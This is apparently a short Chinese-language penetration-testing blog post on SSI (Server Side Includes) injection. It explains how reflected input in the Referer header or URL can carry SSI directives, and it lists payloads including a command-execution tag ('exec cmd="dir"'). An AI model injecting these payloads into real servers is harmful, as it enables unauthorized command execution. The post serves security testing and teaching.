+++
date = "2017-06-08T11:20:15+08:00"
description = ""
draft = false
tags = ["injection"]
title = "SSI注入"
topics = ["Pentest"]

+++

### 0x00 SSI
> SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。

> 在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞

> 若注入点在url中则可能需要进行url编码

### 0x01 payload
> ```
"-->'-->`--><!--#set var="a" value="123"--><!--#set var="b" value="654"--><!--#echo var="a"--><!--#echo var="b"-->

<!--#echo var="DATE_LOCAL" -->

<!--#exec cmd="dir" -->
```

### 0x02 示例
* Referer被输出到了页面中

> {{% fluid_img src="/img/post/ssi_in_referer_request.png" alt="ssi漏洞" %}}
<br><br>
> {{% fluid_img src="/img/post/ssi_in_referer_response.png" alt="ssi漏洞" %}}

* url中的数据被输出到页面中(有时候url中的payload需要url编码)

> {{% fluid_img src="/img/post/ssi_in_url_request.png" alt="ssi漏洞" %}}
<br><br>
{{% fluid_img src="/img/post/ssi_in_url_response.png" alt="ssi漏洞" %}}